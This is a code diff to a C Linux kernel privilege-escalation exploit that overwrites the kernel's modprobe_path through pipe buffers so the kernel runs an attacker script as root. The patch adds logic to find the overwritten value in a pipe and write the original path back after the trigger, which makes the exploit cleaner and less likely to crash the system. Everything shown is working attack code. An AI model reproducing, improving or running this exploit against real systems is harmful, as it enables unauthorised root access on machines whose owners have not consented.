@@ -213,9 +213,10 @@ int main(void)
 	bool success = false;
 	char err_act[64];
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	char modprobe_back[KMOD_PATH_LEN] = { 0 };
 	char pipe_data[PIPE_CAPACITY];
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
-	int act_fd = -1, pipe_ret = -1;
+	int act_fd = -1, pipe_ret = -1, pipe_idx = -1, pipe_off = -1;
 	int ret = EXIT_FAILURE;
 	int pipe_fds[PIPES_N][2];
 
@@ -299,6 +300,7 @@ int main(void)
 						perror("[-] write");
 						goto end;
 					} /* clang-format on */
+					pipe_idx = i, pipe_off = j;
 					success = true;
 					break;
 				}
@@ -328,12 +330,37 @@ int main(void)
 		goto end;
 	}
 
+	memcpy(modprobe_back, modprobe_path, sizeof(modprobe_path));
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
 		goto end;
 	printf("[+] Overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
 
 	trigger_modprobe_sock();
+
+	printf("[*] Attempting to restore modprobe_path...\n");
+	ret = read(pipe_fds[pipe_idx][0], pipe_data, sizeof(pipe_data));
+	if (ret < 0) {
+		perror("[-] read");
+		goto end;
+	}
+	if (memcmp(pipe_data + pipe_off, privesc_script_path, sizeof(privesc_script_path)) == 0) {
+		printf("[+] Located \"%s\" at offset 0x%lx of pipe #%d\n", modprobe_path,
+		       (unsigned long)pipe_off, pipe_idx);
+		memcpy(pipe_data + pipe_off, modprobe_back, sizeof(modprobe_back));
+		if (write(pipe_fds[pipe_idx][1], pipe_data, sizeof(pipe_data)) < 0) {
+			perror("[-] write");
+			goto end;
+		}
+	} else {
+		printf("[-] Unable to restore modprobe_path\n");
+		goto end;
+	}
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	if (ret == EXIT_FAILURE)
+		goto end;
+	printf("[+] Restored modprobe_path successfully: \"%s\"\n", modprobe_path);
+
 	ret = EXIT_SUCCESS;
 
 end:
